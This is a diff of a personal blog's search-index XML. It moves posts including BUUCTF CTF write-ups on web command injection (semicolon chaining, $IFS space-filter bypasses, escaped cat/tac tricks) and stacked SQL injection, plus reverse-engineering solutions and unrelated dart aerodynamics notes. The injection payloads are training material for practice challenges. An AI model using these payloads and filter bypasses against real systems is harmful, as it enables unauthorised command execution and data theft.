@@ -244,61 +244,51 @@ noip2021再战
       </tags>
   </entry>
   <entry>
-    <title>2024青工会 南航飞镖内容总结</title>
-    <url>/2024/08/23/2024%E9%9D%92%E5%B7%A5%E4%BC%9A-%E5%8D%97%E8%88%AA%E9%A3%9E%E9%95%96%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[2024.11.06二次编辑
-没时间回来看了，直接着手做吧，有问题再回来找经验
+    <title>BUUCTF Web wp</title>
+    <url>/2024/08/16/BUUCTF-Web-wp/</url>
+    <content><![CDATA[[ACTF2020 新生赛]Exec
+输入127.0.0.1;ls
 
+发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
+最终在127.0.0.1;cd ../../../;ls找到了flag文件
 
-官方镖头设计的不是很好，但是阻力可以接受
-弹道解算，有控镖和无控镖都可以使用
+输入127.0.0.1;cd ../../../;ls得到flag
 
+flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
+[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
+根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
 
-迫击炮/摩擦轮型，把重量拉满，可以增加抗扰性
-对碳板前缘倒圆角，升力提高阻力减小（小迎角可行，大迎角雷诺数较高进而失真）
-官方镖头对升力系数影响不大，对阻力影响较大
+得知不能输入空格
 
+所以我们需要绕过空格使用一下平替
+$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
+输入/?ip=127.0.0.1;cat$IFS1flag.php
 
+我们查看index.php
 
-增加边条翼，可以调节气动中心
+使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
+F12即可得到flag
 
+;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
+flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
+[SUCTF 2019]EasySQL
+堆叠注入查询数据库
+1; show databases;
 
+查询表名
 
-相对抽象的设计
+1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
+尝试访问Flag，发现不行
+输入*,1
 
-
-好处：有充足的升力
-坏处：容易坏
-
-机翼经过特殊设计，升阻比能到6以上
-很耐摔
-两个舵机用来控制
-
-飞镖的雷诺数值比昆虫大一点，比鸟小
-
-所以不针对该雷诺数进行翼型设计，或者特殊处理，将会很容易失速
-
-对称翼型容易失速，越厚越容易失速
-
-
-NACA0002这种类似平板，反而更不容易分离
-如果分离，会变得非线性
-
-增加一个后掠，在前缘拉出一个脱体涡来延缓分离
-
-
-后掠角越大，可用引脚越大
-
-S翼在0力矩（俯仰力矩为零）的时候是有升力的
-
-快速加速，陀螺仪可能会
-
-]]></content>
+这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
+flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
+[强网杯 2019]随便注]]></content>
       <categories>
-        <category>电控</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>RoboMaster</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -460,130 +450,6 @@ DOM 监听：MutationObserver 监听动态元素，实时更新样式
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF RE wp</title>
-    <url>/2024/08/13/BUUCTF-RE-wp/</url>
-    <content><![CDATA[easyre
-F5一下出
-
-直接打开的话，结束之后自动闪退，所以要用cmd
-
-flag:flag&#123;this_Is_a_EaSyRe&#125;
-reverse1shift+F12，然后Ctrl+F搜索关键词flag
-
-双击进入，ctrl+x查看交叉引用
-
-然后点击F5查看源码
-
-得到这一段内容，选中数字单击 r 可以转化为ascll码对应的字母
-可以知道，for循环把str2的 o 替换为 0
-
-双击 str2 进入，可以看到str2的数值
-
-那么flag就是替换之后的
-flag:flag&#123;hell0_w0rld&#125;
-reverse2IDA打开，一键F5
-
-发现是把i和r替换为1
-
-双击flag查看内容
-
-发现有一段是hacking_for_fun&#125;，替换即可得到flag
-flag:flag&#123;hack1ng_fo1_fun&#125;
-内涵的软件拖进查壳软件
-
-发现是32位文件，拖进IDA32
-shift+F12即可看到flag
-
-flag:flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;
-新年快乐发现是32位程序
-
-用IDA打开发现有壳
-
-拖进FFI工具中自动去壳
-
-然后拖进IDA，F5发现flag
-
-flag:flag&#123;HappyNewYear!&#125;
-xor32位
-
-拖进IDA，F5
-
-可以发现flag是异或得到的
-双击global，shift+E获得aFKWOXZUPFVMDGH的值
-
-保存到十进制，编写脚本即可获得flag
-l = [  102,  10, 107,  12, 119,  38,  79,  46,  64,  17,   120,  13,  90,  59,  85,  17, 112,  25,  70,  31,   118,  34,  77,  35,  68,  14, 103,   6, 104,  15,    71,  50,  79,   0]flag = &quot;&quot;flag += chr(l[0])for i in range(1,len(l)):    flag += chr(l[i]^l[i-1])print( flag )
-flag:flag&#123;QianQiuWanDai_YiTongJiangHu&#125;
-reverse3查壳发现没壳，32位，打开
-
-shift+F12看到flag
-
-双击，然后ctrl+x查看交叉引用，然后F5一下，得到以下页面
-
-进入sub_4110BE函数，发现是base64加密
-后面还有一个简单的位移运算
-密文变量是 Str2，shift+E保存
-
-编写脚本得到flag
-import base64s = [  101, 51, 110, 105, 102, 73, 72, 57, 98, 95,   67, 64, 110, 64, 100, 72]flag = &quot;&quot;for i in range(len(s)):    flag += chr(s[i]-i)print( flag )print( base64.b64decode(flag) )
-flag:flag&#123;i_l0ve_you&#125;
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF Web wp</title>
-    <url>/2024/08/16/BUUCTF-Web-wp/</url>
-    <content><![CDATA[[ACTF2020 新生赛]Exec
-输入127.0.0.1;ls
-
-发现真的把 index.php（也就是ls的操作结果）真的输出了，说明没有过滤分号
-最终在127.0.0.1;cd ../../../;ls找到了flag文件
-
-输入127.0.0.1;cd ../../../;ls得到flag
-
-flag:flag&#123;4e3b851f-9a72-42c9-a57a-d6698548cdc0&#125;
-[GXYCTF2019]Ping Ping Ping发现有一个/?ip=
-根据上一题的经验，我们输入/?ip=127.0.0.1;ls，得到
-
-得知不能输入空格
-
-所以我们需要绕过空格使用一下平替
-$&#123;IFS&#125;$9&#123;IFS&#125;$IFS$&#123;IFS&#125;$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; &#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来%20   (space)%09   (tab)X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）
-输入/?ip=127.0.0.1;cat$IFS1flag.php
-
-我们查看index.php
-
-使用 /?ip=127.0.0.1;e=g;cat$IFS$1fla$e.php
-F12即可得到flag
-
-;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真%0a  （换行）%0d  （回车）---ps:有时会禁用cat:解决方法是使用tac反向输出命令：linux命令中可以加\，所以甚至可以ca\t /fl\ag---?ip=127.0.0.1;cat$IFS$9`ls`$IFS在Linux下表示为空格$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用
-flag:flag&#123;ef88dbb0-2c4d-4489-9fdb-02ce4c5d6fa1&#125;
-[SUCTF 2019]EasySQL
-堆叠注入查询数据库
-1; show databases;
-
-查询表名
-
-1;show columns from Flag;#select $_GET[&#x27;query&#x27;] || flag from flag
-尝试访问Flag，发现不行
-输入*,1
-
-这里的原理是sql=select.post[‘query’].&quot;||flag from Flag&quot;;如果$post[‘query’]的数据为*,1，sql语句就变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。这里说一下我的理解这里输入*,1,这里会增加一个临时列，他的列名为1，然后那一列的值都为1。当我们只关心数据表有多少记录行而不需要知道具体的字段值时，类似“select 1 from tblName”是一个很不错的SQL语句写法，它通常用于子查询。这样可以减少系统开销，提高运行效率，因为这样子写的SQL语句，数据库引擎就不会去检索数据表里一条条具体的记录和每条记录里一个个具体的字段值并将它们放到内存里，而是根据查询到有多少行存在就输出多少个“1”，每个“1”代表有1行记录，同时选用数字1还因为它所占用的内存空间最小，当然用数字0的效果也一样。在不需要知道具体的记录值是什么的情况下这种写法无疑更加可取。
-flag:flag&#123;70066add-3cd0-49ec-84b3-8e6ee05c3dd9&#125;
-[强网杯 2019]随便注]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -804,6 +670,140 @@ flagflag&#123;RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro&#125;
       </tags>
   </entry>
   <entry>
+    <title>BUUCTF RE wp</title>
+    <url>/2024/08/13/BUUCTF-RE-wp/</url>
+    <content><![CDATA[easyre
+F5一下出
+
+直接打开的话，结束之后自动闪退，所以要用cmd
+
+flag:flag&#123;this_Is_a_EaSyRe&#125;
+reverse1shift+F12，然后Ctrl+F搜索关键词flag
+
+双击进入，ctrl+x查看交叉引用
+
+然后点击F5查看源码
+
+得到这一段内容，选中数字单击 r 可以转化为ascll码对应的字母
+可以知道，for循环把str2的 o 替换为 0
+
+双击 str2 进入，可以看到str2的数值
+
+那么flag就是替换之后的
+flag:flag&#123;hell0_w0rld&#125;
+reverse2IDA打开，一键F5
+
+发现是把i和r替换为1
+
+双击flag查看内容
+
+发现有一段是hacking_for_fun&#125;，替换即可得到flag
+flag:flag&#123;hack1ng_fo1_fun&#125;
+内涵的软件拖进查壳软件
+
+发现是32位文件，拖进IDA32
+shift+F12即可看到flag
+
+flag:flag&#123;49d3c93df25caad81232130f3d2ebfad&#125;
+新年快乐发现是32位程序
+
+用IDA打开发现有壳
+
+拖进FFI工具中自动去壳
+
+然后拖进IDA，F5发现flag
+
+flag:flag&#123;HappyNewYear!&#125;
+xor32位
+
+拖进IDA，F5
+
+可以发现flag是异或得到的
+双击global，shift+E获得aFKWOXZUPFVMDGH的值
+
+保存到十进制，编写脚本即可获得flag
+l = [  102,  10, 107,  12, 119,  38,  79,  46,  64,  17,   120,  13,  90,  59,  85,  17, 112,  25,  70,  31,   118,  34,  77,  35,  68,  14, 103,   6, 104,  15,    71,  50,  79,   0]flag = &quot;&quot;flag += chr(l[0])for i in range(1,len(l)):    flag += chr(l[i]^l[i-1])print( flag )
+flag:flag&#123;QianQiuWanDai_YiTongJiangHu&#125;
+reverse3查壳发现没壳，32位，打开
+
+shift+F12看到flag
+
+双击，然后ctrl+x查看交叉引用，然后F5一下，得到以下页面
+
+进入sub_4110BE函数，发现是base64加密
+后面还有一个简单的位移运算
+密文变量是 Str2，shift+E保存
+
+编写脚本得到flag
+import base64s = [  101, 51, 110, 105, 102, 73, 72, 57, 98, 95,   67, 64, 110, 64, 100, 72]flag = &quot;&quot;for i in range(len(s)):    flag += chr(s[i]-i)print( flag )print( base64.b64decode(flag) )
+flag:flag&#123;i_l0ve_you&#125;
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024青工会 南航飞镖内容总结</title>
+    <url>/2024/08/23/2024%E9%9D%92%E5%B7%A5%E4%BC%9A-%E5%8D%97%E8%88%AA%E9%A3%9E%E9%95%96%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[2024.11.06二次编辑
+没时间回来看了，直接着手做吧，有问题再回来找经验
+
+
+官方镖头设计的不是很好，但是阻力可以接受
+弹道解算，有控镖和无控镖都可以使用
+
+
+迫击炮/摩擦轮型，把重量拉满，可以增加抗扰性
+对碳板前缘倒圆角，升力提高阻力减小（小迎角可行，大迎角雷诺数较高进而失真）
+官方镖头对升力系数影响不大，对阻力影响较大
+
+
+
+增加边条翼，可以调节气动中心
+
+
+
+相对抽象的设计
+
+
+好处：有充足的升力
+坏处：容易坏
+
+机翼经过特殊设计，升阻比能到6以上
+很耐摔
+两个舵机用来控制
+
+飞镖的雷诺数值比昆虫大一点，比鸟小
+
+所以不针对该雷诺数进行翼型设计，或者特殊处理，将会很容易失速
+
+对称翼型容易失速，越厚越容易失速
+
+
+NACA0002这种类似平板，反而更不容易分离
+如果分离，会变得非线性
+
+增加一个后掠，在前缘拉出一个脱体涡来延缓分离
+
+
+后掠角越大，可用引脚越大
+
+S翼在0力矩（俯仰力矩为零）的时候是有升力的
+
+快速加速，陀螺仪可能会
+
+]]></content>
+      <categories>
+        <category>电控</category>
+      </categories>
+      <tags>
+        <tag>RoboMaster</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Beaver三元组用于乘法共享</title>
     <url>/2025/04/10/Beaver%E4%B8%89%E5%85%83%E7%BB%84%E7%94%A8%E4%BA%8E%E4%B9%98%E6%B3%95%E5%85%B1%E4%BA%AB/</url>
     <content><![CDATA[Beaver 三元组（Beaver triples）是安全多方计算（MPC）中一个超级聪明、实用的技巧，用来安全地做乘法
@@ -860,41 +860,6 @@ xy = c + d \cdot b + e \cdot a + d \cdot e
       </categories>
       <tags>
         <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CF补题小合集</title>
-    <url>/2025/01/19/CF%E8%A1%A5%E9%A2%98%E5%B0%8F%E5%90%88%E9%9B%86/</url>
-    <content><![CDATA[由于后续CF比赛基本只参加VP，故特此记录一下
-
-
-2025.01.17Codeforces Round 996 (Div. 2)
-这把打爽了，表现分差点上紫，D题最后一分钟调出来过样例 结果WA2了
-
-C题构造题
-我们从(1,1)开始思考，假设场景是这样的
-
-设每行每列的和都为$S$，故(1,1)的数值和$S$的大小成线性关系
-也就是说，知道$S$就能通过这一行的数求出(1,1)的数值（如蓝色所示）
-
-同理，知道$S$就能求出第二行的数值（如紫色所示）
-
-按顺序（沿路径）向下递推，就必然可以计算出下一个方格的数据（如红色所示）
-
-故得出结论：如果该位置的下一个是R，则通过列计算；否则通过行计算
-但是$S$还不知道哇~
-梅瓜吸，$S$是多少都可以，我直接让它是0（更正式的，由$x+1$个未知数的$x$个方程构成的方程组中，存在一个自由量，这个自由量可以是S；其中$x=n+m-2$）
-#include&lt;iostream&gt;#define int long longusing namespace std;const int N = 1e3;int n , m;int a[N+10][N+10];string s;signed main()&#123;    int t;cin &gt;&gt; t;    while( t -- )&#123;        cin &gt;&gt; n &gt;&gt; m &gt;&gt; s;        for(int i = 1;i &lt;= n;i ++)&#123;            for(int j = 1;j &lt;= m;j ++)&#123;                cin &gt;&gt; a[i][j];            &#125;        &#125;        int x , y;x = y = 1;        for(int p = 0,i,j;p &lt; s.length();p ++)&#123;            if( s[p] == &#x27;D&#x27; )&#123;                for(j = 1;j &lt;= m;j ++)&#123;                    if( j == y ) continue;                    a[x][y] += a[x][j];                &#125;a[x][y] = -a[x][y];                x ++;            &#125;            if( s[p] == &#x27;R&#x27; )&#123;                for(i = 1;i &lt;= n;i ++)&#123;                    if( i == x ) continue;                    a[x][y] += a[i][y];                &#125;a[x][y] = -a[x][y];                y ++;            &#125;        &#125;        for(int j = 1;j &lt; m;j ++) a[n][m] += a[n][j];        a[n][m] = -a[n][m];        for(int i = 1;i &lt;= n;i ++)&#123;            for(int j = 1;j &lt;= m;j ++)&#123;                cout &lt;&lt; a[i][j] &lt;&lt; &quot; &quot;;            &#125;cout &lt;&lt; endl;        &#125;    &#125;return 0;&#125;
-D题不容易的思维题，不过只要逻辑理清楚了，都很简单
-考虑以下策略仅考虑两个相邻的点如果二者的距离小于k，则可以直接越过去，a[i]的值尽可能的大如果二者的距离大于k但是小于k+已过去的时间，则右侧点有能力移动到a[i-1]+k，也不需要额外消耗时间如果二者的距离大于k+已过去的时间，则右侧点应当从一开始就开始全力左移，并二者相向而行，代价是相向而行的时间
-值得注意的是，long double最后要转成long long不然输出的可能是科学计数法（WA6）
-#include&lt;iostream&gt;#define int long longusing namespace std;const int N = 2e5;int n , k , l;long double ans , time_now;long double a[N+10];signed main()&#123;    int t;cin &gt;&gt; t;    while( t -- )&#123;ans = 0;        cin &gt;&gt; n &gt;&gt; k &gt;&gt; l;        for(int i = 1;i &lt;= n;i ++) cin &gt;&gt; a[i];        ans += a[1]*2;        time_now = a[1];        a[1] = 0;        for(int i = 2;i &lt;= n;i ++)&#123;            if( a[i] - a[i-1] &gt; k )&#123;                if( a[i] - a[i-1] &gt; k + time_now )&#123;                    a[i] -= time_now;                    ans += (a[i] - a[i-1] - k);                    time_now += (a[i] - a[i-1] - k)/2;                    a[i] -= (a[i] - a[i-1] - k) / 2;                &#125;else&#123;                    a[i] = a[i-1] + k;                &#125;            &#125;else&#123;                a[i] = min( a[i-1] + k , a[i] + time_now );            &#125;        &#125;        ans += max( (l - a[n] - k )*2 , (long double)0 );        cout &lt;&lt; (long long)ans &lt;&lt; endl;    &#125;return 0;&#125;
-]]></content>
-      <categories>
-        <category>算法竞赛</category>
-      </categories>
-      <tags>
-        <tag>算法竞赛</tag>
       </tags>
   </entry>
   <entry>
@@ -1015,28 +980,6 @@ flag:flag&#123;DASCTF_zjut&#125;
       </tags>
   </entry>
   <entry>
-    <title>CS2025参会游记</title>
-    <url>/2025/05/17/CS2025%E5%8F%82%E4%BC%9A%E6%B8%B8%E8%AE%B0/</url>
-    <content><![CDATA[
-  7b22b1899bb4d215751e07a80f0d88de542d676cb326d0c5d6a10c6353002e1c857d400123ac95c955b82c9a27c938fe6272a98c0e32cec6e393fe8f9eec356e2a6c241e30fb6422803d97d1c60f1d1b4f731c0251f3851cd9bb88bf8eccbc1704b16a372922f03402096fd78f2f7acfaf8f75ea22be1ef2fc20fee85ec69f949c74f6ec5848ecbd05cf228684901fe99f5f2cdeb3b0d1f2f3de79b3977b4df94e5794f825f949e67c26f7efe1061de9434d87d0e809c706396d2f6427e599ac648e41f8491141e2ea714fc3b06783b74b2ccc11f702039aa608aa360c5899871f935c452fed0adf199978ecc6cb799f4e64d3f1aefeb7123b72b44a56f937dc58a56d298060a8921010ccc5f624877541633246f68b87181ba0e4fedf6d05dba9ed585c440968067e83d22276e4ad10bd1f34c21678edb06e758a26560f8e03f2afb3637154d75050ceb8a2c267ff0bf51249c4b22a25761b4632d7e3b0426f6c18c50e6ab843c8aad0c977e8ed28c20f0f84499db0af6f8c4f834b83ffb8bc4d521cff5668e6248a7fd2dd59723191ab07b4712e2411a2822bc53e9bfdd6a4a51f753fdf15fb053ed24f8c70c249826c94f09e1105bb81a4708d6434ae6333515f3fcdd4c32d051a928101b1af16fdd12a3ea5f6a87fc42928a6638fe752fc6afe449da331e76e0b3d82eec070f4b4ea6f015543de15ca576b127d5fbc018cc899c97fbf02e4c6cb19d56091ed11081b579c351aabd7b58975dbd9da5c7e125101c516b5cedda6abd2c40390c863a3b6943091759be92c39f8207a3115729c468b9901b0e4132ac505dba949960504abe277447088d5e3dcb02706229afc09f0c6150f34f5e9fac329d060e229eb253f65527db35d3ec962e0b72a2ca53d8d8195d8b75b0fe957a7f0cd798b7b955669f6b10bdcede0e59b1710e3f71f8771062a5ee3b1ea1267506e91e3b448397ec381c6eae0aa6c6a8a3e92a53d10797c7fd2b1ac8ebbaa917a5606dabbbb6d9f489ab029154aea84619368c6d92f308fda94eede11649a547a68b2c7812b2f0cb98a15507fae2ad0e7706c5dfeb6afb6fd7beeca71bbf1a7e6ac9db79200b5b499e574be33dba5b930ef0ba7b84a7265733f4f196de49f0196e02f17f1add4c78cfcdd5a29504c0a949607ef8d98996b1e40215639497a4103621e44227439e6b19063b827ff2cd5dea33d94eb37a9127c18b6b9afd27ccae240974419f8b7d1703009fef854721ee86f9fdf47dc6a60b0ed935d1bbde4a16d0746b8b924367fb9a125b0b691deeb84509c201716b350e8e8d78bbf85d54fc7660be412ca619e3e658c1cee499bd48046850ff90353f7ca1b3844ebc6d55bacc3c5ed78314faf652d409ab2aaf8453850111679ac879b95069a9d1c72b7d4ee9e158e78b0382b65f8a6e5ad60f12a085162f11fd54fd8190d2b3eb3b383f25ed3839d99a29ac3d824428dc6d14b1a76a22445baabdb9cda5d93f305324dc35162e0a16614a81f67f4f4f9928cf0fbada33073edde8d737e44f997f8101905bb665c7617ea4084c3a22791f076420a3d4bd2d8344c1c687cf7a0349ff0461345eff76ac61180078f28d7d5f1adeea74eaf7fc6341124461785d53f8615880b2c424e63deb72e01012ff2ef840b17579980e9d2b6a769cd0969d0bc1faaa85671d02a32edc8eede6a0ae4d572d4b418b9bc50aa1864c2196babf19fa370615f84f99cf3f643187fb6b036873df906c0c45b4fd03e04d303c2001c552e05f7704187d26f004498d3f756a435c12c87214262eddb503d49162e7f5d376f963d9e95cea8cab55f860b2f39a6b27e068eef376adb1e856b9e7d4e1493aa8670fa045536121de103c7b570ab1f0735b9c1cc6f40aace50347e3df30c3b54804f5ea40680ed082a88747f7c0aeb656dfb50e464a0f5386bec6e1e64ddb7ba9456fc738c43aa02c9d73bee6728c6e8f5dfab8828c337d8408e4d7c09294879b3243763f70c4e3cf2c509116a5186d9d9540936a0fd8e17aca5d4bca6eab2843d11d361627d78f9160a905f5ec5d8355a1c1e69cec92a7ad07207ffe7d000accba77b5d781f2c90df53a03433df9fbe237830281114beb40752245361e1c8a8b6a61ad782c1e61c1959f60df34912e43f1a84e9532bf263e846f4b9bd56be3e688dc2c2bdb98e33067f74c8266072e51f79ba40d567e896fb7ac5ed97c1c55c538dcfa7336c2df5abd117f20e256e938f766dd012866f28ed6cf26140dbde556984cf0cc89f02e67eb666ab7609f3a799ed0e51dc05f61884d8cd5f80c017e4624fa0ce778c7d13d33f36f7c0b8ed1151e21a0d3b6ae9749a686905adb14ad1d4ae30a7290abaa8a1c6c648fc9b72582821a64f38abedffddfe089095f0c9ab091c0173b4f7448cd99ae6d01f6fa58acfe9bb78d10ae5805b14118b82536b6e9bc87b08a1f7ff78ce4acd1ec5a178f590b4604929907a4acc85fd62be5ee2b27b8caf875996e1a9f18da998a2e017c7888b63a298912ac91f7ad85523f6096d61ef4430c897b2dd2e0b1fc52b19e958013c24c8f9a80ae37b849895a89151a6b78ad7242d36db0045ec213d9e0bf945d2cac37a9013561f3dda9c07b76c7486e9d19ea18e08c905941d001a81490b72ab3803f049094031ee962eeb03e32185b088951a78153fc67ff5a41defb641ba4db2e8ff1d26275cf1c9878e98b54b251cbfd2006245e4cce71e6fae08f7536a22334aff3e9431095975f55f3dc18a05e7bc75dba5d395d7b4d35b6715822492cc14ca478eed0510079c26056f5c0a3a34a7396c1bcf8fa492796fc4aae7c5444ddf0265129091cccc466501c7cb1531579ae0184273d14d6e33a16626f6f26f88cea3f347fadbbe7fcb5e33bb4de2bd10f99a991b9044f823ddc8948cbc8898af1680d03cac325afedac8a4ed61ec8c78227a8af4d565f727cc46a1d94562c162cc82b50b1057bd05f18e9e9e93aad91e93b9834c8c37f1d7b055ebcc319c7a80fac256ee3172197fc09913c1bda1c132be59676560fc7273bcc1294a12f9cb961bd70552de074c7270098d03a0ea1c002c4f62c14e9c856cfd2266f59468b8ee06092219565f493698c336d6ed25ff14785fa13be693f6fcd08977b10e7efe7605ac61e5ffdabdc7a65add8d626dc72675a6c03a673063ad4514b5240b031345b854c4c385285ceb385b67
-  
-    
-      
-      
-        Hey, password is required here.
-      
-    
-  
-
-]]></content>
-      <categories>
-        <category>会议竞赛游记</category>
-      </categories>
-      <tags>
-        <tag>游记</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CS2025摘要小结</title>
     <url>/2025/05/19/CS2025%E6%91%98%E8%A6%81%E5%B0%8F%E7%BB%93/</url>
     <content><![CDATA[本文对第九届网络空间安全国际研讨会的分享知识进行小结
@@ -1071,6 +1014,28 @@ Contribution：构造了一个高效的后量子aPAKE协议（基于KEM）；基
       </categories>
       <tags>
         <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS2025参会游记</title>
+    <url>/2025/05/17/CS2025%E5%8F%82%E4%BC%9A%E6%B8%B8%E8%AE%B0/</url>
+    <content><![CDATA[
+  7b22b1899bb4d215751e07a80f0d88de542d676cb326d0c5d6a10c6353002e1c857d400123ac95c955b82c9a27c938fe6272a98c0e32cec6e393fe8f9eec356e2a6c241e30fb6422803d97d1c60f1d1b4f731c0251f3851cd9bb88bf8eccbc1704b16a372922f03402096fd78f2f7acfaf8f75ea22be1ef2fc20fee85ec69f949c74f6ec5848ecbd05cf228684901fe99f5f2cdeb3b0d1f2f3de79b3977b4df94e5794f825f949e67c26f7efe1061de9434d87d0e809c706396d2f6427e599ac648e41f8491141e2ea714fc3b06783b74b2ccc11f702039aa608aa360c5899871f935c452fed0adf199978ecc6cb799f4e64d3f1aefeb7123b72b44a56f937dc58a56d298060a8921010ccc5f624877541633246f68b87181ba0e4fedf6d05dba9ed585c440968067e83d22276e4ad10bd1f34c21678edb06e758a26560f8e03f2afb3637154d75050ceb8a2c267ff0bf51249c4b22a25761b4632d7e3b0426f6c18c50e6ab843c8aad0c977e8ed28c20f0f84499db0af6f8c4f834b83ffb8bc4d521cff5668e6248a7fd2dd59723191ab07b4712e2411a2822bc53e9bfdd6a4a51f753fdf15fb053ed24f8c70c249826c94f09e1105bb81a4708d6434ae6333515f3fcdd4c32d051a928101b1af16fdd12a3ea5f6a87fc42928a6638fe752fc6afe449da331e76e0b3d82eec070f4b4ea6f015543de15ca576b127d5fbc018cc899c97fbf02e4c6cb19d56091ed11081b579c351aabd7b58975dbd9da5c7e125101c516b5cedda6abd2c40390c863a3b6943091759be92c39f8207a3115729c468b9901b0e4132ac505dba949960504abe277447088d5e3dcb02706229afc09f0c6150f34f5e9fac329d060e229eb253f65527db35d3ec962e0b72a2ca53d8d8195d8b75b0fe957a7f0cd798b7b955669f6b10bdcede0e59b1710e3f71f8771062a5ee3b1ea1267506e91e3b448397ec381c6eae0aa6c6a8a3e92a53d10797c7fd2b1ac8ebbaa917a5606dabbbb6d9f489ab029154aea84619368c6d92f308fda94eede11649a547a68b2c7812b2f0cb98a15507fae2ad0e7706c5dfeb6afb6fd7beeca71bbf1a7e6ac9db79200b5b499e574be33dba5b930ef0ba7b84a7265733f4f196de49f0196e02f17f1add4c78cfcdd5a29504c0a949607ef8d98996b1e40215639497a4103621e44227439e6b19063b827ff2cd5dea33d94eb37a9127c18b6b9afd27ccae240974419f8b7d1703009fef854721ee86f9fdf47dc6a60b0ed935d1bbde4a16d0746b8b924367fb9a125b0b691deeb84509c201716b350e8e8d78bbf85d54fc7660be412ca619e3e658c1cee499bd48046850ff90353f7ca1b3844ebc6d55bacc3c5ed78314faf652d409ab2aaf8453850111679ac879b95069a9d1c72b7d4ee9e158e78b0382b65f8a6e5ad60f12a085162f11fd54fd8190d2b3eb3b383f25ed3839d99a29ac3d824428dc6d14b1a76a22445baabdb9cda5d93f305324dc35162e0a16614a81f67f4f4f9928cf0fbada33073edde8d737e44f997f8101905bb665c7617ea4084c3a22791f076420a3d4bd2d8344c1c687cf7a0349ff0461345eff76ac61180078f28d7d5f1adeea74eaf7fc6341124461785d53f8615880b2c424e63deb72e01012ff2ef840b17579980e9d2b6a769cd0969d0bc1faaa85671d02a32edc8eede6a0ae4d572d4b418b9bc50aa1864c2196babf19fa370615f84f99cf3f643187fb6b036873df906c0c45b4fd03e04d303c2001c552e05f7704187d26f004498d3f756a435c12c87214262eddb503d49162e7f5d376f963d9e95cea8cab55f860b2f39a6b27e068eef376adb1e856b9e7d4e1493aa8670fa045536121de103c7b570ab1f0735b9c1cc6f40aace50347e3df30c3b54804f5ea40680ed082a88747f7c0aeb656dfb50e464a0f5386bec6e1e64ddb7ba9456fc738c43aa02c9d73bee6728c6e8f5dfab8828c337d8408e4d7c09294879b3243763f70c4e3cf2c509116a5186d9d9540936a0fd8e17aca5d4bca6eab2843d11d361627d78f9160a905f5ec5d8355a1c1e69cec92a7ad07207ffe7d000accba77b5d781f2c90df53a03433df9fbe237830281114beb40752245361e1c8a8b6a61ad782c1e61c1959f60df34912e43f1a84e9532bf263e846f4b9bd56be3e688dc2c